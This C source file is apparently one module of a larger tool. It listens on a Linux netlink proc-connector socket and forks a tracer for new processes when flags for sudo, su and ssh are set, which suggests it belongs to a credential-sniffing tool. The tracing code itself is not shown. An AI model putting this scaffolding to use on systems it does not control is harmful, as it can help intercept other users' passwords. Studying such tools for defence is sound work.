#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/connector.h>
#include <linux/cn_proc.h>
#include <errno.h>
#include <signal.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#define FILE_PLISTEN 1
#include "config.h"
#include "helpers.h"
#include "tracers.h"

void childsig(int x) {
  fprintf(stderr, "[-] Plisteneter %d has been killed %d\n", getpid(), x);
  exit(0);
}

/* sets up the kernel and user space communication */
int nl_connect(void) {
  int rc = 0;
  int nl_sock = 0;
  struct sockaddr_nl sa_nl;

  memset(&sa_nl, 0, sizeof(sa_nl));
  nl_sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_CONNECTOR);

  if (nl_sock == -1) {
    fatal("Unable to create nl_socket\n");
    return -1;
  }

  sa_nl.nl_family = AF_NETLINK;
  sa_nl.nl_groups = CN_IDX_PROC;
  sa_nl.nl_pid = getpid();

  rc = bind(nl_sock, (struct sockaddr *)&sa_nl, sizeof(sa_nl));

  if (rc == -1) {
    close(nl_sock);
    fatal("Unable to bind nl_socket\n");
  }

  return nl_sock;
}

/* some weird ass shit
 * uses net link socket nonsense 
 * need to replace with regular ass sockets
 */
int set_proc_ev_listen(int nl_sock, bool enable) {
  // set the return code
  int rc = 0;
  // idk what the fuck this shit does
  struct __attribute__ ((aligned(NLMSG_ALIGNTO))) {
    struct nlmsghdr nl_hdr;
    struct __attribute__ ((__packed__)) {
      struct cn_msg cn_msg;
      enum proc_cn_mcast_op cn_mcast;
    };
  } nlcn_msg;

  memset(&nlcn_msg, 0, sizeof(nlcn_msg));

  // sets up the netlink socket
  nlcn_msg.nl_hdr.nlmsg_len = sizeof(nlcn_msg);
  nlcn_msg.nl_hdr.nlmsg_pid = getpid();
  nlcn_msg.nl_hdr.nlmsg_type = NLMSG_DONE;

  nlcn_msg.cn_msg.id.idx = CN_IDX_PROC;
  nlcn_msg.cn_msg.id.val = CN_VAL_PROC;
  nlcn_msg.cn_msg.len = sizeof(enum proc_cn_mcast_op);

  // need to figure out whats going on here i have no clue
  nlcn_msg.cn_mcast = enable ? PROC_CN_MCAST_LISTEN : PROC_CN_MCAST_IGNORE;

  // write a message on the netlink socket
  rc = send(nl_sock, &nlcn_msg, sizeof(nlcn_msg), 0);

  // check if the message sent
  if (rc == -1)
    fatal("netlink unable to send\n");

  return 0;
}

/* signal handler function
 * i think this is pretty much the driving function
 * on signal this function gets called
 */
int handle_proc_ev(int nl_sock) {
  // child process id
  pid_t child = 0;
  int rc = 0;

  // idk what the fuck this shit does
  struct __attribute__ ((aligned(NLMSG_ALIGNTO))) {
    struct nlmsghdr nl_hdr;
    struct __attribute__ ((__packed__)) {
      struct cn_msg cn_msg;
      struct proc_event proc_ev;
    };
  } nlcn_msg;

  memset(&nlcn_msg, 0, sizeof(nlcn_msg));

  // recieve a message on the netlink socket
  while (1) {
    rc = recv(nl_sock, &nlcn_msg, sizeof(nlcn_msg), 0);

    if (rc == 0 || rc == -1)
      continue;

    switch (nlcn_msg.proc_ev.what) {
      case PROC_EVENT_EXEC:
        //Do this check here so we don't spawn a process for nothing
        // these are in the config.h idk the use of them though - v
        if (!ENABLE_SUDO && !ENABLE_SU && !ENABLE_SSH_CLIENT)
          break;

        // fork the child id
        child = fork();
        if (child == 0) {
          // trace it, idk exactly what its doing yet
          trace_process(nlcn_msg.proc_ev.event_data.id.process_pid);
          exit(0);
        }
        break;
      case PROC_EVENT_UID:
        //Do this check here so we don't spawn a process for nothing
        // these are in the config.h idk the use of them though - v
        if (!ENABLE_SSH)
          break;

        // fork the child id
        child = fork();
        if (child == 0) {
          // trace it, idk exactly what its doing yet
          trace_process(nlcn_msg.proc_ev.event_data.id.process_pid);
          exit(0);
        }
        break;
      default:
        break;
    }
  }
}

void plisten(void) {
  // socket to communicate to the kernel with 
  int nl_sock = 0;
  // return code
  int rc = EXIT_SUCCESS;

  // set up the signal handlers
  // child sig appears to just print shit? 
  signal(SIGINT, childsig);
  signal(SIGQUIT, childsig);
  signal(SIGHUP, childsig);
  signal(SIGPIPE, childsig);
  signal(SIGTERM, childsig);
  signal(SIGSEGV, childsig);
  signal(SIGBUS, childsig);
  signal(SIGILL, childsig);
  signal(SIGCHLD, SIG_IGN);

  // sets up the netlink socket
  nl_sock = nl_connect();

  // if the returning file descritor is -1, couldnt connect
  if (nl_sock == -1)
    fatal("nl_connect() failed\n");

  //  
  rc = set_proc_ev_listen(nl_sock, true);

  if (rc == -1) {
    close(nl_sock);
    fatal("set_proc_ev_listen failed\n");
  }
  // 
  handle_proc_ev(nl_sock);
}
